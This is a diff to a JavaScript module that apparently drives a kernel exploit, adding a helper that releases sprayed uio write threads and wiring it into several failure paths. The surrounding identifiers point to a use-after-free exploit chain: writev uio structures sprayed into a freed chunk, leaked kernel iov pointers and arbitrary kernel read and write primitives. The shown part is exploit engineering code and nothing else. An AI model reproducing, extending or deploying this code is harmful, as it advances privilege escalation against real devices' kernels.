@@ -4448,6 +4448,28 @@ export function makePoopsEngine(X) {
     }
   }
 
+  async function releaseUioWriteAndSettle(why, size) {
+    const b = S.buf;
+    const g = S.uioWriteGroup;
+    if (!g || !g.spawned || !g.spawned.length) return;
+    const n = Math.max(1, size || 8);
+    try {
+      await runBuilt("uioW-release-" + why, () => {
+        armRet(PK.UIO_THREAD_NUM);
+        for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
+          emit(PSYS.WRITE, retPtr(i), S.uioSockB, b.uioWriteBuf.base, n);
+      });
+      await H.waitFinished(g, PK.WAIT_DEADLINE_MS, "uioW-release:" + why);
+      flushMark("UIOW-RELEASED", why + "-size=" + n);
+    } catch (err) {
+      forceSettled(g, "uioW-release-failed-" + why);
+      flushMark(
+        "UIOW-RELEASE-FAILED",
+        why + "-" + String((err && err.message) || err).slice(0, 80),
+      );
+    }
+  }
+
   async function stage0(opts) {
     const o = opts || {};
     const max =
@@ -7028,14 +7050,14 @@ export function makePoopsEngine(X) {
         " rounds: no writev " +
         "uio in the freed chunk";
       forceSettled(S.uioWriteGroup, "kwriteA-exhausted");
-      await releaseUioAndSettle("kwriteA-exhausted", size);
+      await releaseUioWriteAndSettle("kwriteA-exhausted", size);
       return out;
     }
 
     const leaked = r64(b.readback.u8, PK.OFF.UIO_IOV);
     if (isZero64(leaked) || !isKernelPtr(leaked)) {
       out.why = "kwrite leaked_iov " + hx(leaked) + " is not canonical";
-      await releaseUioAndSettle("kwriteA-bad-iov", size);
+      await releaseUioWriteAndSettle("kwriteA-bad-iov", size);
       return out;
     }
 
@@ -7050,7 +7072,7 @@ export function makePoopsEngine(X) {
         hx(leaked) +
         ", refusing to write";
       flushMark("KWRITE-IOV-CHANGED", out.why.slice(0, 150));
-      await releaseUioAndSettle("kwrite-iov-changed", size);
+      await releaseUioWriteAndSettle("kwrite-iov-changed", size);
       return out;
     }
 
@@ -7100,7 +7122,7 @@ export function makePoopsEngine(X) {
         "uio never landed (outLen/segflg as kread)";
       forceSettled(S.iovGroup, "kwriteB-exhausted");
       await releaseIovAndSettle("kwriteB-exhausted");
-      await releaseUioAndSettle("kwriteB-exhausted", size);
+      await releaseUioWriteAndSettle("kwriteB-exhausted", size);
       return out;
     }
 
@@ -9055,6 +9077,7 @@ export function makePoopsEngine(X) {
     STEPS,
     terminateBurn,
     releaseUioAndSettle,
+    releaseUioWriteAndSettle,
     drainUioBuffer,
 
     get triggered() {
